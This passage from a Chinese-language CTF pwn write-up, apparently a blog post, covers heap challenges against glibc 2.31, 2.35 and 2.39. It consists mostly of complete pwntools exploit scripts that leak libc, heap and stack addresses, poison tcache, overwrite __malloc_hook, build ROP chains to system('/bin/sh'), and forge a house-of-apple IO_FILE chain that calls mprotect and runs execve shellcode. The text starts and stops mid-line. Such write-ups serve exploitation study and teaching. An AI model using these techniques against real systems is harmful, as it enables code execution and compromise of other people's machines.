class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>p.sendlineafter(<span class="hljs-string">b&#x27;content : &#x27;</span>,content)<br><br><span class="hljs-comment"># gadget</span><br>one_gadget1 = <span class="hljs-number">0xe3afe</span><br>one_gadget2 = <span class="hljs-number">0xe3b01</span> <br>one_gadget3 = <span class="hljs-number">0xe3b04</span><br><br><span class="hljs-comment"># leak libc_base</span><br>create(<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>)<br>create(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;content : &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak - <span class="hljs-number">2018272</span><br>log.success(<span class="hljs-string">&quot;libc_base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>one_gadget = libc_base + one_gadget2<br><br>create(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)<br>create(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>,p64(malloc_hook))<br><br>create(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)<br>create(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>)<br><br>edit(<span class="hljs-number">5</span>,p64(one_gadget))<br>create(<span class="hljs-number">6</span>,<span class="hljs-number">0x10</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="heap-2-35"><a href="#heap-2-35" class="headerlink" title="heap-2.35"></a>heap-2.35</h2><h3 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h3><p>glibc2.35，tcache的next指针指向经PROTECT_PTR处理的指针，并且加了内存对齐检测<br>取消了hook机制，虽然libc中仍然有这些符号，但已经没有作用了</p><ul><li>__free_hook</li><li>__malloc_hook</li><li>__realloc_hook</li><li>__memalign_hook</li><li>__after_morecore_hook</li></ul><ol><li>利用unsorted bin 泄露libc基址</li><li>利用tcache的PROTECT_PTR机制泄露堆地址，调试计算heap基址</li><li>利用environ泄露栈地址<br>这里想直接覆盖到edit函数的返回地址的，但是由于内存对齐，只能覆盖到rbp。往上是canary，往下覆盖不到返回地址<br>但create函数栈帧和edit函数相同，覆盖到rbp又会导致create函数创建堆时将返回地址当成tcache key从而置为0</li><li>利用栈泄露ptr地址</li><li>将堆分配到ptr上，修改某个堆块的指针，修改为edit返回地址的地址</li><li>然后写个rop的链子，成功getshell</li></ol><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.terminal =[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">index,size</span>):<br>        p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>        p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>        p.sendlineafter(<span class="hljs-string">b&#x27;size? &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>        p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>        p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>        p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>        p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>        p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>        p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>        p.sendlineafter(<span class="hljs-string">b&#x27;content : &#x27;</span>,content)<br><br><span class="hljs-comment"># leak libc_base</span><br>create(<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>)<br>create(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content : &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak - <span class="hljs-number">2206944</span><br>log.success(<span class="hljs-string">&quot;libc_base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># leak heap_base</span><br>delete(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content : &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = (leak&lt;&lt;<span class="hljs-number">12</span>)-<span class="hljs-number">0x1000</span><br>log.success(<span class="hljs-string">&quot;heap_base : &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>environ = libc_base + libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>pop_rdi = libc_base + <span class="hljs-number">0x2a3e5</span><br>ret = libc_base + <span class="hljs-number">0x2a3e6</span><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>create(<span class="hljs-number">2</span>,<span class="hljs-number">0x60</span>)<br>create(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>,p64(environ^((heap_base+<span class="hljs-number">0x2a0</span>)&gt;&gt;<span class="hljs-number">12</span>)))<br><br><span class="hljs-comment"># leak stack</span><br>create(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>)<br>create(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>)<br>show(<span class="hljs-number">5</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content : &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>stack_addr = leak-<span class="hljs-number">0x128</span><br>log.success(<span class="hljs-string">&#x27;stack_addr : &#x27;</span>+<span class="hljs-built_in">hex</span>(stack_addr))<br><br>create(<span class="hljs-number">6</span>,<span class="hljs-number">0x90</span>)<br>create(<span class="hljs-number">7</span>,<span class="hljs-number">0x90</span>)<br>delete(<span class="hljs-number">7</span>)<br>delete(<span class="hljs-number">6</span>)<br>edit(<span class="hljs-number">6</span>,p64(stack_addr^((heap_base+<span class="hljs-number">0x000380</span>)&gt;&gt;<span class="hljs-number">12</span>)))<br><br><span class="hljs-comment"># leak ptr</span><br>create(<span class="hljs-number">8</span>,<span class="hljs-number">0x90</span>)<br>create(<span class="hljs-number">9</span>,<span class="hljs-number">0x90</span>)<br>payload = cyclic(<span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">9</span>,payload)<br>show(<span class="hljs-number">9</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content : &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">0x18</span>+<span class="hljs-number">6</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>ptr = leak + <span class="hljs-number">0x002956</span> <br>log.success(<span class="hljs-string">&#x27;ptr : &#x27;</span> + <span class="hljs-built_in">hex</span>(ptr))<br><br>create(<span class="hljs-number">10</span>,<span class="hljs-number">0xa0</span>)<br>create(<span class="hljs-number">11</span>,<span class="hljs-number">0xa0</span>)<br>delete(<span class="hljs-number">11</span>)<br>delete(<span class="hljs-number">10</span>)<br>edit(<span class="hljs-number">10</span>, p64(ptr^((heap_base+<span class="hljs-number">0x4c0</span>)&gt;&gt;<span class="hljs-number">12</span>)))<br><br>create(<span class="hljs-number">12</span>,<span class="hljs-number">0xa0</span>)<br>create(<span class="hljs-number">13</span>,<span class="hljs-number">0xa0</span>)<br><br>target = stack_addr - <span class="hljs-number">0x18</span><br>edit(<span class="hljs-number">13</span>,p64(target))<br>log.info(<span class="hljs-string">&#x27;target : &#x27;</span> + <span class="hljs-built_in">hex</span>(target))<br><br>edit(<span class="hljs-number">0</span>,p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system_addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>最近学了<code>house of apple</code>，所以用<code>house of apple</code>重新做了这道题</p><p>泄露<code>libc_base</code>和<code>heap_base</code>的部分没有太大变化<br>后面利用<code>largebin attack</code>在<code>_IO_list_all</code>的地方写上伪造的IO_FILE_plus<br>然后利用mprotect函数修改堆上的执行权限，最后在堆上执行shellcode</p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.terminal =[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;node2.anna.nssctf.cn&quot;,28596)</span><br><br>elf = ELF(<span class="hljs-string">&quot;./heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size? &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content : &#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content : &#x27;</span>)<br>libc_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = libc_addr - <span class="hljs-number">0x21ace0</span><br>log.success(<span class="hljs-string">&quot;libc_base -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x4e0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = heap_addr - <span class="hljs-number">0x20a</span><br>log.success(<span class="hljs-string">&quot;heap_base -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x710</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x700</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x900</span>)<br>delete(<span class="hljs-number">6</span>)<br>edit(<span class="hljs-number">4</span>,p64(libc_base+<span class="hljs-number">0x21b190</span>)+p64(libc_base+<span class="hljs-number">0x21b190</span>)+p64(heap_base+<span class="hljs-number">0x7c0</span>)+p64(libc_base+libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x900</span>)<br><br>shellcode = <span class="hljs-string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br>fake_IO_FILE = heap_base + <span class="hljs-number">0xf00</span><br><br>f = flat(&#123;<br>    <span class="hljs-number">0x0</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _flags</span><br>    <span class="hljs-number">0x8</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_read_ptr</span><br>    <span class="hljs-number">0x10</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_read_end</span><br>    <span class="hljs-number">0x18</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_read_base</span><br>    <span class="hljs-number">0x20</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_write_base</span><br>    <span class="hljs-number">0x28</span>: <span class="hljs-number">1</span>, <span class="hljs-comment"># _IO_write_ptr</span><br>    <span class="hljs-number">0x30</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_write_end</span><br>    <span class="hljs-number">0x38</span>: fake_IO_FILE + <span class="hljs-number">0x280</span>, <span class="hljs-comment"># _IO_buf_base</span><br>    <span class="hljs-number">0x40</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_buf_end</span><br>    <span class="hljs-number">0x48</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_save_base</span><br>    <span class="hljs-number">0x50</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_backup_base</span><br>    <span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_save_end</span><br>    <span class="hljs-number">0x60</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># markers</span><br>    <span class="hljs-number">0x68</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _chain</span><br>    <span class="hljs-number">0x70</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _fileno</span><br>    <span class="hljs-number">0x74</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _flags2</span><br>    <span class="hljs-number">0x78</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _old_offset</span><br>    <span class="hljs-number">0x80</span>: p16(<span class="hljs-number">0</span>), <span class="hljs-comment"># _cur_column</span><br>    <span class="hljs-number">0x82</span>: p8(<span class="hljs-number">0</span>), <span class="hljs-comment"># _vtable_offset</span><br>    <span class="hljs-number">0x83</span>: p8(<span class="hljs-number">0</span>), <span class="hljs-comment"># _shortbuf</span><br>    <span class="hljs-number">0x88</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _lock</span><br>    <span class="hljs-number">0x90</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _offset</span><br>    <span class="hljs-number">0x98</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _codecvt</span><br>    <span class="hljs-number">0xa0</span>: fake_IO_FILE + <span class="hljs-number">0xe0</span>, <span class="hljs-comment"># _wide_data</span><br>    <span class="hljs-number">0xa8</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _freeres_list</span><br>    <span class="hljs-number">0xb0</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _freeres_buf</span><br>    <span class="hljs-number">0xb8</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># __pad5</span><br>    <span class="hljs-number">0xc0</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _mode</span><br>    <span class="hljs-number">0xc4</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _unused2</span><br>    <span class="hljs-number">0xd8</span>: libc_base + <span class="hljs-number">0x2170c0</span>, <span class="hljs-comment">#_vtables</span><br>    &#125;, filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>data = <span class="hljs-built_in">bytes</span>(f).ljust(<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0xe0</span><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x200</span>)<br>data = data.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0x68</span><br>data += p64(libc_base + <span class="hljs-number">0x15d48a</span>) <span class="hljs-comment"># 0x000000000015d48a : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]   </span><br>data = data.ljust(<span class="hljs-number">0x280</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x2a0</span>)<br>data += p64(<span class="hljs-number">0</span>)<br>data += p64(libc_base + <span class="hljs-number">0x162f64</span>) <span class="hljs-comment"># 0x0000000000162f64 : mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]</span><br>data = data.ljust(<span class="hljs-number">0x2a0</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += p64(<span class="hljs-number">0</span>)<br>data += p64(fake_IO_FILE + <span class="hljs-number">0x2e0</span>)<br>data += p64(libc_base + <span class="hljs-number">0x167420</span>) + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x20</span> <span class="hljs-comment"># 0x0000000000167420 mov rdx,QWORD PTR [rdi+0x8] ; mov QWORD PTR [rsp],rax ; call QWORD PTR [rdx+0x20]</span><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x2a0</span>)<br>data = data.ljust(<span class="hljs-number">0x2e0</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += p64(libc_base + <span class="hljs-number">0xd2ba5</span>)+<span class="hljs-number">0x18</span>*<span class="hljs-string">b&quot;\x00&quot;</span> <span class="hljs-comment"># add rsp,0x20 ; pop rbx ; ret</span><br>data += p64(libc_base + <span class="hljs-number">0x5a120</span>)+<span class="hljs-number">0x8</span>*<span class="hljs-string">b&quot;\x00&quot;</span> <span class="hljs-comment"># mov_rsp_rdx</span><br><br>data += p64(libc_base + <span class="hljs-number">0x2a3e5</span>) <span class="hljs-comment"># pop_rdi</span><br>data += p64(heap_base)<br>data += p64(libc_base + <span class="hljs-number">0x2be51</span>) <span class="hljs-comment"># pop_rsi</span><br>data += p64(<span class="hljs-number">0x10000</span>)<br>data += p64(libc_base + <span class="hljs-number">0x904a9</span>) <span class="hljs-comment"># pop_rdx_rbx</span><br>data += p64(<span class="hljs-number">7</span>)<br>data += p64(<span class="hljs-number">0</span>)<br>data += p64(libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>] + libc_base)<br>data += p64(fake_IO_FILE + <span class="hljs-number">0x380</span>)<br>data = data.ljust(<span class="hljs-number">0x380</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>data += shellcode<br><br>edit(<span class="hljs-number">6</span>,data[<span class="hljs-number">0x10</span>:])<br><br>Exit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="heap-2-39"><a href="#heap-2-39" class="headerlink" title="heap-2.39"></a>heap-2.39</h2><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>之前一直没补上这题，学完<code>house of apple</code>后正好拿这两题练手</p><p>这题多加了一点限制，只能申请大于0x4f0、小于0x1000的堆块，和上题的exp2差不多，只是需要将用于分隔堆块的小堆块调大一点<br>同时还需要重新找gadget</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 